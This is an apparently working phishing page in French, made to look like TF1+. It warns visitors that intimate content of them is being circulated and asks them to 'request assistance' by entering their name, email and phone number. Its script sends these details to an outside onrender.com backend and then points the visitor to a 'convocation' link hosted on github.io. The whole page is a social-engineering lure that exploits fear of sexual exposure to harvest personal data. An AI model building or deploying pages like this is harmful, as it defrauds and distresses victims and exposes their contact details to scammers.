<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Vous recevez un signalement concernant des contenus intimes de vous en cours de diffusion. - TF1+</title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #f4f4f4;
            min-height: 100vh;

            display: flex;
            align-items: center;
            justify-content: center;
        }

        .card {
            width: 100%;
            max-width: 500px;

            background: white;

            padding: 40px;

            border-radius: 16px;

            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.12);
        }

        .logo {
            font-size: 32px;
            font-weight: bold;
            color: #e30613;

            margin-bottom: 25px;
        }

        h1 {
            margin-top: 0;
            color: #222;
        }

        label {
            display: block;

            margin-top: 18px;
            margin-bottom: 7px;

            font-weight: bold;
        }

        input {
            width: 100%;

            padding: 13px;

            border: 1px solid #ccc;

            border-radius: 8px;

            font-size: 15px;
        }

        button {
            width: 100%;

            margin-top: 25px;

            padding: 15px;

            border: none;

            border-radius: 8px;

            background: #e30613;

            color: white;

            font-size: 16px;

            font-weight: bold;

            cursor: pointer;
        }

        button:hover {
            opacity: 0.9;
        }

        #result {
            margin-top: 25px;

            padding: 15px;

            background: #f5f5f5;

            border-radius: 8px;

            word-break: break-word;
        }

        #result a {
            color: #e30613;
            font-weight: bold;
        }
    </style>
</head>

<body>

    <div class="card">

        <div class="logo">
            TF1+
        </div>

        <h1>
            Vous recevez un signalement concernant des contenus intimes de vous en cours de diffusion.
        </h1>

        <p>
            Suivez les instructions et contactez notre service d’assistance..
        </p>

        <label for="name">
            Nom
        </label>

        <input
            type="text"
            id="name"
            placeholder="Nom du contact"
        >

        <label for="email">
            E-mail
        </label>

        <input
            type="email"
            id="email"
            placeholder="adresse@email.com"
        >

        <label for="phone">
            Téléphone
        </label>

        <input
            type="tel"
            id="phone"
            placeholder="+33..."
        >

        <button id="createInvitation">
            💬 Générez une demande d’assistance.
        </button>

        <div id="result"></div>

    </div>

    <script>

        const button =
            document.getElementById("createInvitation");

        const result =
            document.getElementById("result");


        button.addEventListener("click", async function () {

            const name =
                document.getElementById("name").value.trim();

            const email =
                document.getElementById("email").value.trim();

            const phone =
                document.getElementById("phone").value.trim();


            if (!name || !email) {

                result.textContent =
                    "Le nom et l'e-mail sont obligatoires.";

                return;
            }


            result.textContent =
                "Création de l'invitation...";


            try {

                const response = await fetch(
                    "https://tf1-invitation-backend.onrender.com/api/invitations",
                    {
                        method: "POST",

                        headers: {
                            "Content-Type": "application/json"
                        },

                        body: JSON.stringify({
                            name: name,
                            email: email,
                            phone: phone
                        })
                    }
                );


                const data =
                    await response.json();


                if (data.success) {

    const invitationLink =
    "https://tf1-siteweb.github.io/Tf1/invitation.html?token=" +
    encodeURIComponent(data.token);

    result.innerHTML =
        "✅ Invitation créée !<br><br>" +

        "<strong>ID :</strong> " +
        data.invitation_id +

        "<br><br>" +

        "<strong>Lien d'invitation :</strong><br>" +

        "<a href=\"" +
        invitationLink +
        "\" target=\"_blank\">" +

        "🎟️ Accéder à votre convocation" +

        "</a>";

} else {

    result.textContent =
        "❌ " + data.message;
}


            } catch (error) {

                console.error(error);

                result.textContent =
                    "❌ Erreur de connexion au backend :\n\n" +
                    error.message;
            }

        });

    </script>

</body>

</html>
